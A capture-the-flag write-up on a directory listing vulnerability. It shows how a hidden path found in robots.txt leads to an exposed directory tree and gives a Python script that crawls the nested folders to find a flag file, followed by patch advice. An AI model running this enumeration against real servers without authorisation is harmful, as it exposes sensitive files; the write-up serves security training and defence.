# 🧭 Directory Listing

## 📖 Definition

**Directory listing** is a vulnerability that occurs when a web server improperly exposes the contents of a directory to users. When directory listing is enabled, users can view all the files and subdirectories within a folder on the server, often via a browser. This happens because the server does not have an index file (e.g., `index.html` or `index.php`) to display by default, and the web server is configured to list the directory's contents instead.

**Key Characteristics:**

- It reveals sensitive information, such as configuration files, backup files, database dumps, or scripts.
- It can facilitate reconnaissance by attackers, providing insights into the structure and contents of the server.

**Risks:**

1. **Information Disclosure:** Attackers may discover sensitive files (e.g., credentials, README files containing flags).
2. **Facilitates Exploitation:** Exposed files or scripts can lead to further attacks, such as code injection or privilege escalation.
3. **Data Breaches:** Attackers might download entire directories to sift through information offline.

## 🔍 Discovery

We first discover the existence of the `robots.txt` file by digging some infos and trying to access to this address: `http://<ip>/robots.txt`. Once done, the page displays:

```Text
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

The second line will be useful for an another breach but for now, let's focus on the last line: `Disallow: /.hidden`. We simply try to access to `http://<ip>/.hidden` and then we land on a page with a list of directories and a `README` file. We quickly realized that all the directories are nested into each other and that there is always a `README` file with a size of 34 bytes. All the `README` files that we downloaded contain troll messages so we bet on the fact that there will be one with the flag. So we code a little Python script to find this flag!

## 🏁 Flag

<u>**The dumb way:**</u>

1. Go on `http://<ip>/.hidden`
2. Browse ALL the directories and download ALL the `README` files you'll find
3. ...

## 💡 Solutions

We chose to use Beautiful Soup for our Python script.

**script.py | Usage: `python script.py <ip>`**

```Python
import requests, sys
import urllib.request
from bs4 import BeautifulSoup

def directory_listing(url):
	response = requests.get(url)
	soup = BeautifulSoup(response.text, "lxml")
	for link in soup.find_all('a'):
		if link.get('href') == "README" :
			f = urllib.request.urlopen(url + '/' + link.get('href'))
			myfile = f.read().decode('utf-8')
			if "flag" in myfile:
				print(myfile)
			break
		elif link.get('href') != "../":
			directory_listing(url + '/' + link.get('href'))
	
def main():
	if len(sys.argv) != 2:
		print("Usage: python script.py <ip>")
		sys.exit(1)
	directory_listing("http://" + sys.argv[1] + "/.hidden")

if __name__ == "__main__":
	main()
```

This Python script is designed to recursively search for a `README` file within a hidden directory structure on a remote server, specified by an IP address. The script takes an IP address as a command-line argument, constructs a URL for the `.hidden` directory, and performs a recursive directory listing using the `requests` library and Beautiful Soup to parse the HTML. It checks all the links on each page, and if a `README` file is found, it attempts to open and read the file. If the file contains the word "flag", it prints the contents of the file. The script stops the recursion upon finding the `README` file or after visiting all directories.

## 🔧 Patch

Many defensive measures can be taken, but here are the main ones:

- **Directory listing:** disable directory listing in the web server configuration. This can be done for Apache, Nginx, or other web servers.
- **`.htaccess` file:** use a `.htaccess` file (Apache) or other access control mechanisms to restrict access to sensitive directories, such as the one containing the flag.
- **Web Application Firewalls:** detect and block directory listing and other attacks. A WAF can inspect incoming traffic for malicious activity and prevent unauthorized access to sensitive directories and files.
- **Proper indexing:** Ensure every directory has a valid `index` file (e.g., `index.html`, `index.php`). This prevents the server from defaulting to directory listing when a user accesses a directory URL directly.
- **Access control and authentication:** require authentication before granting access to sensitive directories and files.

## 🧰 Toolbox

- [Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
- [Scrapy](https://scrapy.org/)

## 📚 References

- [Directory Browsing (ScienceDirect)](https://www.sciencedirect.com/topics/computer-science/directory-browsing#:~:text=Directory%20browsing%20is%20the%20ability,folders%20stored%20on%20the%20server.)
- [Directory Listing (PortSwigger)](https://portswigger.net/kb/issues/00600100_directory-listing)
- [Qu’est ce que le Directory Browsing/Listing ? (IT-Connect)](https://www.it-connect.fr/quest-ce-que-le-directory-browsinglisting/)
